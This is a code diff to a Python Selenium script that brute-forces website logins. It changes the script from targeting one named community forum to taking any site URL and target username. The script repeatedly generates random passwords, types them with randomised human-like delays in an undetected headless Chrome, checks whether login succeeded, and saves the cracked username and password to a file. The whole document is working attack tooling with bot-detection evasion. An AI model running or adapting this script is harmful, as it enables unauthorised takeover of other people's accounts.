@@ -13,7 +13,6 @@ from selenium.webdriver.support.ui import WebDriverWait
 
 load_dotenv()
 
-used_passwords = []
 user_agents = []
 # chrome_portable_path = os.getenv('CHROME_PORTABLE_PATH')
 webdriver_path = os.getenv('WEBDRIVER_PATH')
@@ -35,7 +34,7 @@ def generate_password():
     return password
 
 
-def browser_task(username, tmp_password):
+def browser_task(target_site, username, tmp_password):
     # create a new Chrome browser instance
     options = Options()
     options.add_argument('--headless')
@@ -50,16 +49,16 @@ def browser_task(username, tmp_password):
 
     browser = uc.Chrome(options=options, driver_executable_path=webdriver_path)
     # navigate to the website
-    browser.get('https://community.primordial.dev/')
+    browser.get(target_site)
 
     # add random delay
     time.sleep(random.randint(2, 7))
 
     # find the login input field and enter username
     username_field = WebDriverWait(browser, 10).until(
-        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="login"]'))
+        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="username"]'))
     )
-    # username_field = browser.find_element_by_css_selector('input[name="login"]')
+    # username_field = browser.find_element_by_css_selector('input[name="username"]')
     for c in username:
         username_field.send_keys(c)
         time.sleep(random.randrange(1, 2))
@@ -82,57 +81,43 @@ def browser_task(username, tmp_password):
 
     # find and click the "Log in" button
     login_button = WebDriverWait(browser, 10).until(
-        EC.presence_of_element_located((By.CSS_SELECTOR, '.button--icon--login'))
+        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="submit"]'))
     )
     login_button.click()
 
     # add random delay
     time.sleep(random.randint(3, 8))
 
-    we_in = True
+    result_we_re_in = True
     if "login" in browser.current_url:
-        we_in = False
+        result_we_re_in = False
         time.sleep(random.randint(1, 3))
         browser.refresh()
         if "login" in browser.current_url:
-            we_in = False
+            result_we_re_in = False
     browser.close()
     time.sleep(3)
-    return we_in
+    return result_we_re_in
 
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
+    if len(sys.argv) != 3:
         sys.exit(1)
+        
     # read user agents from file
     if os.path.isfile('user_agents.txt'):
         with open('user_agents.txt') as f:
             user_agents = f.read().splitlines()
-    if os.path.isfile('used_passwords.txt'):
-        with open('used_passwords.txt') as f:
-            used_passwords = f.read().splitlines()
 
-    target = sys.argv[1]
+    target_site = sys.argv[1] # url https://example.com/login
+    target = sys.argv[2] # target username
     if os.path.isfile(f'{target}.txt'):
         print("Target already resolved!")
         sys.exit(2)
-    else:
-        used_passwords.clear()
 
     while True:
-        first_pass = True
-        regen_pass = False
-        tmp_pass = ""
-        while regen_pass or first_pass:
+        tmp_pass = generate_password()
+        while not browser_task(target_site, target, tmp_pass):
             tmp_pass = generate_password()
-            first_pass = False
-            for used_pass in used_passwords:
-                if tmp_pass == used_pass:
-                    regen_pass = True
-                    break
-        status = browser_task(target, tmp_pass)
-        used_passwords.append(tmp_pass)
-        if status:
-            with open(f"{target}.txt", "w") as f:
-                f.write(f"{target};{tmp_pass}\n")
-            break
+        with open(f"{target}.txt", "w") as f:
+            f.write(f"{target};{tmp_pass}\n")
